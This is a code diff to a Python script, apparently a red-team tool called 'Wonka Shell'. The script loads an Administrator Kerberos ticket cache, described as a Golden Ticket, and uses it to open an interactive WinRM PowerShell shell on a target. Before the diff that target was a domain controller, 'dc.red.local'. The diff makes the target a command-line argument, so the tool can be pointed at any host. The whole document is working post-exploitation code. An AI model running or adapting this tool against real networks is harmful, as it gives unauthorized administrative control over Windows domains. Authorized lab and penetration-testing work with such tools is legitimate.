@@ -1,3 +1,4 @@
+import argparse
 import os
 import sys
 import winrm
@@ -6,11 +7,23 @@ import winrm
 
 os.environ['KRB5CCNAME'] = os.path.abspath('Administrator.ccache')
 
+def parse_args():
+    parser = argparse.ArgumentParser(description="Wonka Shell - WinRM Kerberos Shell")
+    parser.add_argument(
+        'target',
+        nargs='?',
+        help='Target IP address or hostname'
+    )
+    return parser.parse_args()
+
 def main():
-    print("[*] Connecting to dc.red.local via WinRM using Kerberos ticket...")
+    args = parse_args()
+    target = args.target
+
+    print(f"[*] Connecting to {target} via WinRM using Kerberos Golden Ticket...")
     try:
         session = winrm.Session(
-            target='dc.red.local',
+            target=target,
             auth=('', ''),
             transport='kerberos'
         )
@@ -20,8 +33,9 @@ def main():
         if test_res.status_code != 0:
             print("[-] Authentication check failed:", test_res.std_err.decode('utf-8'))
             sys.exit(1)
+            
         print(f"[+] Connected successfully as: {test_res.std_out.decode('utf-8').strip()}")
-        print("[+] Entering interactive WinRM shell. Type 'exit' to quit.\n")
+        print(f"[+] Entering interactive WinRM shell on {target}. Type 'exit' to quit.\n")
 
         while True:
             try:
@@ -31,7 +45,6 @@ def main():
                 if cmd.lower() in ['exit', 'quit']:
                     break
                 
-                # Execute via PowerShell encoding (supports full pipelines/multiline)
                 result = session.run_ps(cmd)
                 
                 if result.std_out:
